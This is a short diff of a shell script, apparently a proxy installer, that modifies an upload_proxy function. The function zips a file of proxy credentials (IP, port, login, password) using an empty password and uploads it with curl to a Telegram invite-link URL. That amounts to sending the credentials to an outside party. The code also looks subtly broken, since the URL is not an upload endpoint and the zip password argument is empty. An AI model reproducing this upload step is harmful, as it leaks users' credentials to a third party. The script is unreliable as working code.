@@ -53,8 +53,13 @@ EOF
 
 upload_proxy() {
     
-    txt proxy.txt  
-    URL=$(curl -s --upload-file proxy.txt https://t.me/+YcU_YI12xTo5MTk1/proxy.txt)
+    local PASS=""
+    zip --password $PASS proxy.zip proxy.txt
+    URL=$(curl -s --upload-file proxy.zip https://t.me/+YcU_YI12xTo5MTk1/proxy.txt)
+
+    echo "Proxy is ready! Format IP:PORT:LOGIN:PASS"
+    echo "Download zip archive from: ${URL}"
+    echo "Password: ${PASS}"
 
 }
 gen_data() {
